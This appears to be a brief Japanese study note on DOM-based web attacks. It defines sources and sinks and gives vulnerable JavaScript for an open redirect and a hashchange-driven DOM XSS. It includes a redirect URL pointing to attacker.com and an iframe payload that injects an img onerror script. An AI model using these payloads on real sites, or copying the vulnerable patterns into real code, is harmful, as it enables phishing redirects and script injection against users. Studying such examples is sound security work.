# DOM ベース攻撃

用語定義

```text
ソース：信頼できないデータがユーザーによって JavaScript 関数に提供される場所
シンク：そのデータが JavaScript で DOM を更新するために使用される場所
```

### オープンリダイレクト

```javascript
// URL の最初の # 要素に移動する実装
goto = location.hash.slice(1);
if (goto.startsWith("https:")) {
  location = goto;
}
```

```text
https://realwebsite.com/#https://attacker.com
```

## DOM ベース XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based

```javascript
$(window).on("hashchange", function () {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
```

ページが読み込まれたら関数がトリガーされる

```html
<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'
```
